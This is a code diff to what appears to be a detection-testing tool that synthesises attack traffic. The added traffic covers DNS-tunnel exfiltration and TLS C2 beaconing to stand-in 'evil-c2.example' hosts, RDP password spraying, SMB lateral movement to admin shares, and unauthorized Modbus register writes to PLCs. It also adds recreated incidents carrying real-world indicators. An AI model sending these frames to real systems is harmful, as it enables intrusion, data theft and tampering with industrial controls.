@@ -16,7 +16,7 @@ from __future__ import annotations
 import ipaddress
 import struct
 from dataclasses import dataclass
-from typing import Callable, Dict, List, Tuple
+from typing import Callable, Dict, List, Optional, Tuple
 
 from . import packet as P
 from .enterprise import (FINGERPRINTS, OUI_DELL, OUI_SCHNEIDER, OUI_SIEMENS,
@@ -188,6 +188,92 @@ def tristation(ep: Endpoints, count: int) -> List[bytes]:
     return frames
 
 
+def dns_tunnel(ep: Endpoints, count: int) -> List[bytes]:
+    """DNS tunneling / exfil: long, high-entropy subdomains of a C2 base domain
+    carried in TXT queries (the signature of data smuggled over DNS)."""
+    base = ep.meta.get("domain", "tun.evil-c2.example")
+
+    def qname(name: str) -> bytes:
+        return b"".join(bytes([len(p)]) + p.encode()
+                        for p in name.split(".")) + b"\x00"
+
+    frames = []
+    for i in range(count):
+        label = f"{(i * 2654435761) & 0xffffffffffff:012x}" * 2  # 24-char chunk
+        tid = (i + 1) & 0xFFFF
+        q = qname(f"{label}.{base}") + struct.pack("!HH", 16, 1)   # TXT, IN
+        query = struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 0) + q
+        frames.append(P.udp_frame(ep, True, _sport(), 53, query, ident=i))
+        resp = struct.pack("!HHHHHH", tid, 0x8180, 1, 1, 0, 0) + q + \
+            struct.pack("!HHHIH", 0xC00C, 16, 1, 60, 5) + b"\x04data"
+        frames.append(P.udp_frame(ep, False, 53, _sport(), resp, ident=i))
+    return frames
+
+
+def https_c2(ep: Endpoints, count: int) -> List[bytes]:
+    """Encrypted C2 over TLS: repeated ClientHellos to a C2 host carrying its
+    SNI — what a sensor fingerprints (JA3/SNI) as beaconing to a bad domain."""
+    meta = dict(ep.meta)
+    meta["sni"] = meta.get("domain", "cdn.evil-c2.example")
+    beacon = Endpoints(client_mac=ep.client_mac, client_ip=ep.client_ip,
+                       server_mac=ep.server_mac, server_ip=ep.server_ip,
+                       vlan=ep.vlan, ttl_client=ep.ttl_client,
+                       ttl_server=ep.ttl_server, meta=meta)
+    from .protocols import https_flow
+    return https_flow(beacon, count)
+
+
+def rdp_brute(ep: Endpoints, count: int) -> List[bytes]:
+    """RDP (3389) password spraying: X.224 Connection Requests carrying the
+    'Cookie: mstshash=<user>' routing token one after another."""
+    users = ep.meta.get("users", ["administrator", "admin", "backup", "svc"])
+    exchanges = []
+    for i in range(count):
+        cookie = f"Cookie: mstshash={users[i % len(users)]}\r\n".encode()
+        x224 = struct.pack("!BBHHB", len(cookie) + 6, 0xE0, 0, 0, 0) + cookie
+        cr = struct.pack("!BBH", 0x03, 0x00, 4 + len(x224)) + x224    # TPKT
+        cc = struct.pack("!BBHBBHHB", 0x03, 0x00, 11, 7, 0xD0, 0, 0, 0)
+        exchanges.append((cr, cc))
+    return _tcp_flow(ep, _sport(), 3389, exchanges)
+
+
+def smb_lateral(ep: Endpoints, count: int) -> List[bytes]:
+    """SMB lateral movement (PsExec-style): SMB2 tree-connects to the hidden
+    ADMIN$ / IPC$ admin shares used to stage and launch remote services."""
+    def nbss(payload: bytes) -> bytes:
+        return struct.pack("!I", len(payload)) + payload
+
+    host = ep.meta.get("host", "FILESRV01")
+    shares = [f"\\\\{host}\\IPC$", f"\\\\{host}\\ADMIN$", f"\\\\{host}\\C$"]
+    exchanges = []
+    for i in range(count):
+        path = shares[i % len(shares)].encode("utf-16-le")
+        hdr = b"\xfeSMB" + struct.pack("<HHIHHIIQ", 64, 0, 0, 3, 1, 0, 0,
+                                       i + 1) + bytes(28)   # SMB2 TREE_CONNECT
+        body = struct.pack("<HHH", 9, 0, 72) + struct.pack("<H", len(path)) + \
+            path
+        req = nbss(hdr + body)
+        resp = nbss(hdr[:16] + struct.pack("<I", 1) + hdr[20:] +
+                    struct.pack("<HBBI", 16, 1, 0, 0x001F01FF))
+        exchanges.append((req, resp))
+    return _tcp_flow(ep, _sport(), 445, exchanges)
+
+
+def modbus_write(ep: Endpoints, count: int) -> List[bytes]:
+    """Unauthorized Modbus control: Write Multiple Registers (FC 0x10) forcing
+    setpoints/outputs on a PLC — the manipulation stage of an ICS attack."""
+    exchanges = []
+    for i in range(count):
+        tid, unit = (i + 1) & 0xFFFF, 1
+        qty = 4
+        values = b"\xde\xad" * qty                 # sentinel forced values
+        pdu = struct.pack("!BHHB", 0x10, 0x0000, qty, qty * 2) + values
+        req = struct.pack("!HHHB", tid, 0, len(pdu) + 1, unit) + pdu
+        ack = struct.pack("!HHHBBHH", tid, 0, 6, unit, 0x10, 0x0000, qty)
+        exchanges.append((req, ack))
+    return _tcp_flow(ep, _sport(), 502, exchanges)
+
+
 ATTACKS: Dict[str, Tuple[AttackBuilder, str]] = {
     "port-scan": (port_scan, "TCP SYN reconnaissance sweep"),
     "eternalblue": (smb_eternalblue, "SMBv1 MS17-010 / DOUBLEPULSAR signature"),
@@ -198,6 +284,31 @@ ATTACKS: Dict[str, Tuple[AttackBuilder, str]] = {
     "s7-control": (s7_control, "S7comm PLC STOP + program download"),
     "iec104-command": (iec104_command, "IEC-104 breaker control commands"),
     "tristation": (tristation, "TriStation writes to a Triconex SIS"),
+    "dns-tunnel": (dns_tunnel, "DNS tunneling / exfil over long TXT queries"),
+    "https-c2": (https_c2, "Encrypted C2 beaconing (TLS SNI to a C2 host)"),
+    "rdp-brute": (rdp_brute, "RDP (3389) password spray (mstshash cookies)"),
+    "smb-lateral": (smb_lateral, "SMB lateral movement to ADMIN$ / IPC$ shares"),
+    "modbus-write": (modbus_write, "Unauthorized Modbus Write Multiple Registers"),
+}
+
+# The registry protocol (tgt.protocols) each attack's traffic is, or None for
+# attack-only traffic with no registry profile (a SYN sweep, Telnet,
+# TriStation). Must cover every ATTACKS key.
+ATTACK_PROTOCOLS: Dict[str, Optional[str]] = {
+    "port-scan": None,
+    "eternalblue": "smb",
+    "c2-beacon": "http",
+    "dga-dns": "dns",
+    "telnet-brute": None,
+    "log4shell": "http",
+    "s7-control": "s7comm",
+    "iec104-command": "iec104",
+    "tristation": None,
+    "dns-tunnel": "dns",
+    "https-c2": "https",
+    "rdp-brute": None,
+    "smb-lateral": "smb",
+    "modbus-write": "modbus",
 }
 
 
@@ -302,6 +413,17 @@ class Incident:
             i += 1
         return out
 
+    def protocols(self) -> List[str]:
+        """Registry protocols this incident's traffic uses, in registry order
+        (attack-only traffic such as a port scan is in :meth:`attack_only`)."""
+        from .protocols import PROFILES
+        used = {ATTACK_PROTOCOLS[f[2]] for f in self.flows}
+        return [k for k in PROFILES if k in used]
+
+    def attack_only(self) -> List[str]:
+        """Attacks in this incident with no registry protocol (e.g. port-scan)."""
+        return sorted({f[2] for f in self.flows if ATTACK_PROTOCOLS[f[2]] is None})
+
     def indicators(self) -> List[str]:
         return sorted({ATTACKS[f[2]][1] for f in self.flows})
 
@@ -376,7 +498,7 @@ _reg(Incident("wannacry", "WannaCry", "IT", "2017",
 
 _reg(Incident("sunburst", "SUNBURST (SolarWinds)", "IT", "2020",
     "Supply-chain backdoor in SolarWinds Orion: DGA subdomain lookups under "
-    "avsvmcloud.com followed by low-and-slow HTTP C2 beaconing.",
+    "avsvmcloud.com, then HTTP C2 and an escalation to encrypted (TLS) C2.",
     [_h("SW-ORION", "10.20.10.55", "web", "win2019"),
      _h("ORION-C2", "10.20.10.200", "web", "linux"),
      _h("DNS01", "10.20.10.12", "dns", "win2019")],
@@ -385,7 +507,9 @@ _reg(Incident("sunburst", "SUNBURST (SolarWinds)", "IT", "2020",
         "3mn5v9x2c1z8b4.appsync-api.eu-west-1.avsvmcloud.com"]}),
      ("SW-ORION", "ORION-C2", "c2-beacon", {
         "domain": "avsvmcloud.com", "uri": "/swip/upd/",
-        "ua": "Mozilla/5.0 (Windows NT 10.0) SolarWinds.BusinessLayerHost"})]))
+        "ua": "Mozilla/5.0 (Windows NT 10.0) SolarWinds.BusinessLayerHost"}),
+     ("SW-ORION", "ORION-C2", "https-c2", {
+        "domain": "avsvmcloud.com"})]))
 
 _reg(Incident("conficker", "Conficker", "IT", "2008",
     "Worm exploiting MS08-067 over SMB (445) with a domain-generation "
@@ -416,7 +540,9 @@ _reg(Incident("log4shell", "Log4Shell", "IT", "2021",
     [_h("ATTACKER", "203.0.113.10", "ws", "linux"),
      _h("WEBAPP01", "10.20.10.55", "web", "linux")],
     [("ATTACKER", "WEBAPP01", "log4shell", {"lhost": "203.0.113.10"}),
-     ("ATTACKER", "WEBAPP01", "port-scan", {"scan_ports": [80, 443, 8080]})]))
+     ("ATTACKER", "WEBAPP01", "port-scan", {"scan_ports": [80, 443, 8080]}),
+     ("WEBAPP01", "ATTACKER", "c2-beacon", {      # the triggered callback
+        "domain": "203.0.113.10:1389", "uri": "/Exploit"})]))
 
 # ---- OT incidents ----------------------------------------------------------
 _reg(Incident("stuxnet", "Stuxnet", "OT", "2010",
@@ -436,7 +562,9 @@ _reg(Incident("industroyer", "Industroyer / CrashOverride", "OT", "2016",
     [_h("INDUSTROYER-C2", "172.16.0.200", "web", "linux"),
      _h("SUBSTATION-HMI", "172.16.0.30", "hmi", "win7"),
      _h("RTU-104", "172.16.1.30", "rtu", "siemens", OUI_SIEMENS)],
-    [("SUBSTATION-HMI", "RTU-104", "iec104-command", {}),
+    [("SUBSTATION-HMI", "RTU-104", "port-scan",
+      {"scan_ports": [2404, 102, 20000]}),
+     ("SUBSTATION-HMI", "RTU-104", "iec104-command", {}),
      ("INDUSTROYER-C2", "SUBSTATION-HMI", "c2-beacon", {
         "domain": "195.16.88.6", "uri": "/xmlrpc"})]))
 
@@ -449,6 +577,108 @@ _reg(Incident("triton", "TRITON / TRISIS", "OT", "2017",
     [("TRITON-ENGWS", "SIS-TRICONEX", "tristation", {}),
      ("TRITON-ENGWS", "SIS-TRICONEX", "port-scan",
       {"scan_ports": [1502, 1500, 502]})]))
+
+_reg(Incident("notpetya", "NotPetya", "IT", "2017",
+    "Destructive worm (disguised as ransomware) spreading via the same SMBv1 "
+    "EternalBlue signature as WannaCry, with a 445 sweep across the subnet.",
+    [_h("NOTPETYA-PATIENT0", "10.20.20.88", "ws", "win7"),
+     _h("WS-ACCT", "10.20.20.45", "ws", "win10"),
+     _h("WS-OPS", "10.20.20.46", "ws", "winxp"),
+     _h("FILESRV01", "10.20.10.13", "file", "win2019")],
+    [("NOTPETYA-PATIENT0", "WS-ACCT", "port-scan", {"scan_ports": [445, 139]}),
+     ("NOTPETYA-PATIENT0", "WS-ACCT", "eternalblue", {}),
+     ("NOTPETYA-PATIENT0", "WS-OPS", "eternalblue", {}),
+     ("NOTPETYA-PATIENT0", "FILESRV01", "eternalblue", {})]))
+
+_reg(Incident("ryuk", "Ryuk Ransomware", "IT", "2019",
+    "Human-operated ransomware: C2 beaconing from a loader, internal 445/3389 "
+    "scanning, then SMBv1 lateral movement across file and user hosts.",
+    [_h("RYUK-LOADER", "10.20.20.90", "ws", "win10"),
+     _h("RYUK-C2", "10.20.10.210", "web", "linux"),
+     _h("FILESRV01", "10.20.10.13", "file", "win2019"),
+     _h("WS-ENG", "10.20.20.47", "ws", "win7")],
+    [("RYUK-LOADER", "RYUK-C2", "c2-beacon", {
+        "domain": "ryuk-pay.example", "uri": "/krbtgt/report"}),
+     ("RYUK-LOADER", "FILESRV01", "port-scan",
+      {"scan_ports": [445, 3389, 135]}),
+     ("RYUK-LOADER", "FILESRV01", "eternalblue", {}),
+     ("RYUK-LOADER", "WS-ENG", "eternalblue", {})]))
+
+_reg(Incident("blackenergy", "BlackEnergy 3", "OT", "2015",
+    "2015 Ukraine grid attack precursor: HTTP C2 beaconing from a spear-phished "
+    "operator workstation and reconnaissance of substation control ports.",
+    [_h("BE-C2", "172.16.0.210", "web", "linux"),
+     _h("OPER-WS", "172.16.0.40", "eng", "win7"),
+     _h("RTU-104", "172.16.1.30", "rtu", "siemens", OUI_SIEMENS)],
+    [("OPER-WS", "BE-C2", "c2-beacon", {
+        "domain": "5.149.254.114", "uri": "/Microsoft/Update/KC074913.php"}),
+     ("OPER-WS", "RTU-104", "port-scan",
+      {"scan_ports": [2404, 102, 502, 20000]})]))
+
+_reg(Incident("emotet", "Emotet", "IT", "2018",
+    "Loader/botnet: HTTP C2 check-ins to compromised hosts and DNS tunneling "
+    "for resilient command and data exfil.",
+    [_h("EMOTET-BOT", "10.20.20.91", "ws", "win10"),
+     _h("EMOTET-C2", "10.20.10.211", "web", "linux"),
+     _h("DNS01", "10.20.10.12", "dns", "win2019")],
+    [("EMOTET-BOT", "EMOTET-C2", "c2-beacon", {
+        "domain": "payments-invoice.example", "uri": "/wp-content/themes/x"}),
+     ("EMOTET-BOT", "DNS01", "dns-tunnel", {"domain": "tun.emotet-c2.example"})]))
+
+_reg(Incident("colonial", "Colonial Pipeline (DarkSide)", "IT", "2021",
+    "Ransomware intrusion: encrypted (TLS) C2 beaconing, RDP password spraying, "
+    "and SMB lateral movement to admin shares before mass encryption.",
+    [_h("DARKSIDE-LOADER", "10.20.20.92", "ws", "win10"),
+     _h("DARKSIDE-C2", "10.20.10.212", "web", "linux"),
+     _h("DC01", "10.20.10.10", "dc", "win2019"),
+     _h("FILESRV01", "10.20.10.13", "file", "win2019")],
+    [("DARKSIDE-LOADER", "DARKSIDE-C2", "https-c2",
+      {"domain": "cdn.darkside-c2.example"}),
+     ("DARKSIDE-LOADER", "DC01", "rdp-brute", {}),
+     ("DARKSIDE-LOADER", "FILESRV01", "smb-lateral", {"host": "FILESRV01"})]))
+
+_reg(Incident("havex", "Havex / Dragonfly", "OT", "2014",
+    "ICS espionage: HTTP C2 to a compromised update server and OPC/ICS port "
+    "scanning to enumerate control-system devices on the plant network.",
+    [_h("HAVEX-C2", "172.16.0.211", "web", "linux"),
+     _h("SCADA-WS", "172.16.0.41", "eng", "win7"),
+     _h("PLC-ENIP", "172.16.1.40", "plc", "rockwell", OUI_WIN)],
+    [("SCADA-WS", "HAVEX-C2", "c2-beacon", {
+        "domain": "update.havex-c2.example", "uri": "/wp08/wp-includes/x.php"}),
+     ("SCADA-WS", "PLC-ENIP", "port-scan",
+      {"scan_ports": [44818, 135, 502, 102, 4840]})]))
+
+_reg(Incident("ekans", "EKANS / Snake", "OT", "2020",
+    "ICS-aware ransomware: SMB lateral movement, then unauthorized Modbus "
+    "writes alongside the stopping of OT processes before encryption.",
+    [_h("EKANS-HOST", "172.16.0.42", "eng", "win10"),
+     _h("HIST-OT", "172.16.0.12", "hist", "win2019"),
+     _h("PLC-MB", "172.16.1.41", "plc", "schneider", OUI_SCHNEIDER,
+        "BMX P34 2020")],
+    [("EKANS-HOST", "HIST-OT", "smb-lateral", {"host": "HIST-OT"}),
+     ("EKANS-HOST", "PLC-MB", "modbus-write", {})]))
+
+_reg(Incident("pipedream", "PIPEDREAM / INCONTROLLER", "OT", "2022",
+    "Modular ICS attack framework: control-protocol port scanning and "
+    "unauthorized Modbus Write Multiple Registers to manipulate PLC outputs.",
+    [_h("PIPEDREAM-ENGWS", "172.16.0.43", "eng", "win10"),
+     _h("PLC-MODICON", "172.16.1.42", "plc", "schneider", OUI_SCHNEIDER,
+        "BME P58 2040"),
+     _h("PLC-OMRON", "172.16.1.43", "plc", "schneider", OUI_SCHNEIDER)],
+    [("PIPEDREAM-ENGWS", "PLC-MODICON", "port-scan",
+      {"scan_ports": [502, 44818, 102, 1911, 2222]}),
+     ("PIPEDREAM-ENGWS", "PLC-MODICON", "modbus-write", {}),
+     ("PIPEDREAM-ENGWS", "PLC-OMRON", "modbus-write", {})]))
+
+_reg(Incident("vpnfilter", "VPNFilter", "OT", "2018",
+    "Router/IoT botnet with an ICS module: HTTP C2 staging and Modbus traffic "
+    "manipulation reaching SCADA/PLC devices behind edge routers.",
+    [_h("VPNFILTER-C2", "10.20.30.210", "web", "linux"),
+     _h("EDGE-ROUTER", "10.20.30.60", "ws", "linux"),
+     _h("PLC-MB2", "172.16.1.44", "plc", "schneider", OUI_SCHNEIDER)],
+    [("EDGE-ROUTER", "VPNFILTER-C2", "c2-beacon", {
+        "domain": "photobucket-cdn.example", "uri": "/api/v1/stage2"}),
+     ("EDGE-ROUTER", "PLC-MB2", "modbus-write", {})]))
 
 
 def get(key: str) -> Incident:
